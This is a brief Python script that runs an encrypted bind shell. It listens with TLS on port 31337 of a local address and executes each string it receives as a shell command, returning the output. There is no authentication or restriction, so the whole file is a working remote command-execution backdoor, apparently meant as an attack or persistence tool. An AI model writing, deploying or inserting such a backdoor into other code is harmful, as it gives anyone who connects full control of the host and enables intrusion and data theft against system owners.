import socket
import ssl
import subprocess
import sys

def pipe_command(arg_list, standard_input=False):
    pipe = subprocess.PIPE if standard_input else None
    subp = subprocess.Popen(arg_list, shell=True, stdin=pipe, stdout=subprocess.PIPE)
    if not standard_input:
        return subp.communicate()[0]
    return subp.communicate(standard_input.encode())[0].decode()

def main():
    HOST = '192.168.0.200'
    PORT = 31337

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((HOST, PORT))
    server_socket.listen(1)

    ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    ctx.load_cert_chain(certfile='server.crt', keyfile='server.key')

    while True:
        client_socket, client_address = server_socket.accept()
        ssl_socket = ctx.wrap_socket(client_socket, server_side=True)

        try:
            while True:
                data = ssl_socket.recv(16804)
                if not data:
                    break
                reply = pipe_command(data.decode())
                if reply is not None:
                    ssl_socket.sendall(reply)
        except KeyboardInterrupt:
            ssl_socket.close()
            sys.exit(0)

if __name__ == '__main__':
    main()
